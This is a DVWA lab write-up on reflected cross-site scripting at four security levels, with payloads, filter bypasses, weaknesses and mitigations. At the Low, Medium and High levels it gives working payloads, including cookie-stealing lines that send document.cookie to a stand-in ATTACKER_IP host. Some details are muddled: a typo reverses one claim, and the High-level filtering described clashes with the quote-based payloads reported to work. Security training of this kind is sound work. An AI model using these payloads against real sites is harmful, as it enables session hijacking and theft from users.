# 🗂️ Reflected_XSS Vulnerability Writeup

📌 Description

Reflected Cross-Site Scripting (XSS) occurs when user input is immediately returned by the server in an HTTP response without proper sanitization. In this scenario, the malicious script is not stored on the server but is reflected back to the victim and executed in their browser.

## ⚙️ Lab Setup
- **Platform**: DVWA (Damn Vulnerable Web Application)
- **Target Page**: `/vulnerabilities/xss_r/`
- **Tested With**: Firefox, Burp Suite, Kali Linux
- **Security Levels Tested**: Low, Medium, High, Impossible

# 🔓 Low Security Level

### 🛠️ Exploitation Steps

1 Navigate to vulnerable page http://127.0.0.1/DVWA/vulnerabilities/xss_r/
2 Observe reflection Hello {USER_INPUT}
3 Inject basic payload:
* http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=<script>alert(1)</script>
4 Try alternative payloads:
* "><img src=x onerror=alert('XSS')>
* <svg onload=alert(document.domain)>
5 Weaponization 
* Replace alert(1) with a real attack to exfiltrate cookies:
* http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=<script>fetch('http://ATTACKER_IP:9000/?c='+document.cookie)</script>
# When the victims clicks this crafted link, their session cookie is sent to theattacker

✅ Result

- Able to execute arbitrary JavaScript in victim’s browser.
- Real-world impact: session hijacking, phishing, keylogging, or redirection
- Payloads reflected without any sanitization or encoding.

🔎 Weaknesses
- No input validation or output encoding.
- Application directly reflects unsanitized user input into HTML.
- No Content Security Policy (CSP) to mitigate exploitation.

🔐 Mitigations
- Input validation and output encoding:  Encode user input before displaying 
- Implement Content Security Policy (CSP): Disallow inscript script and restrict external sources
- Use an allow-list approach : Only allowed expected character should be allowed to execute
NB: This level is critically vulnerable since exploitation is done with filtering.

## 🟡 Medium Security Level

🎯 Exploitation Steps
1 Navigate to vulnerable page http://127.0.0.1/DVWA/vulnerabilities/xss_r/
2 Test basic payload ?name=<script>alert(1)</script> 
* Payloads fails or blocked
3 Try attribute-breaking injection
* ?name=" autofocus onfocus=alert(1) " when the page loads this payload auto-focuses and trigger the alert 
4 Event handlers bypass: Filters blocks <script> tags, but event handlers still  work 
* ?name="><img src=x onerror=alert(1)>
* ?name="><svg onload=alert(document.domain)>
5 Privelege escalation: Steal cookies or redirect with "fetech" or" windows.location"
* ?name="><img src=x onerror="fetch('http://ATTACKER_IP:9000/?c='+document.cookie)"> 
When a victim visits this link, their cookies are sent to the attacker's server

NB: Through the source page, you realize its case sensitive so deceiving the server with this payload <SCRIPT>alert(1)</script> will work. <scr<script>ipt>alert(1)</script> this will strip off the full “script” and will be the with the pieces which will then be full, deceiving the server. 

✅ Result

- Despite filtering, DOM reflection remains exploitable.
- Able to trigger XSS by breaking attribute context and leveraging event handlers.
- Real-world impact: session hijacking, phishing, or user redirection.
 
🔎 Weaknesses
* Filtering focuses on blacklisting <script> tags but does not address:
  * Attribute injection.
  * Event handlers (onerror, onload, etc.).
  * Alternative elements like <svg>, <iframe>.
  * No CSP to block inline JavaScript.

🔐 Mitigations
- Content Security Policy (CSP)
  * Disallow inline scripts and reduce attack surface
- Allow list validation
  * Restrict input strictly to expected patterns

## 🔴 High Security Level

🎯 Exploitation Steps
1 Navigate to: http://127.0.0.1/DVWA/vulnerabilities/xss_r/ and observe the behavior
* Inspect the HTML source. Input from the name parameter is reflected into the page but passed through a stronger sanitization function. <, >, ", and ' are filtered/encoded.
2 Attempted payloads like this fails but harmless 
* ?name=<script>alert(1)</script>
3 Event handlers: Inject with event handlers that bypass filters
 * ?name=" autofocus onfocus=alert(document.domain) "
When page loads, inputs auto-focuses and executes
4 Try other alternative payloads 
 * ?name="><svg onload=alert(document.cookie)>
 * ?name="><img src=x onerror=alert('XSS')>
5 Weaponization: Replace harmless alerts with real attacks, e.g., cookie exfiltration
 * ?name="><img src=x onerror="fetch('http://ATTACKER_IP:9000/?c='+document.cookie)">
  * Victim’s browser executes payload and sends session data to attacker’s server

✅ Result
- Despite advanced filtering, exploitation is possible.
- Successfully executed JavaScript through encoding tricks and event-handler injection.
- Demonstrated potential for session hijacking, credential theft

🔎 Weaknesses
- Application does not enforce strict input validation e.g only alphabets etc
- No CSP prevents inline JavaScript.
- Filtering is blacklist-based, which attackers can bypass with obfuscation.

🔐 Mitigations
- Enforce strong Content Security Policy (CSP) :Block inline scripts and restrict external sources.
- Whitelist input validation: Only accept expected values (e.g., alphabetic names, lengths ≤ 50).

## 🔴 Impossible Level

1 These payloads may fail and not execute
* #<script>alert(1)</script>
* #"><img src=x onerror=alert(1)>
* #?name=" autofocus onfocus=alert(document.domain)

✅ Result
- All attempts are neutralized.
- Application properly encodes special characters (<, >, ", ') before reflecting them.
- No JavaScript execution possible.

NB: This makes the Impossible level not exploitable for reflected XSS.
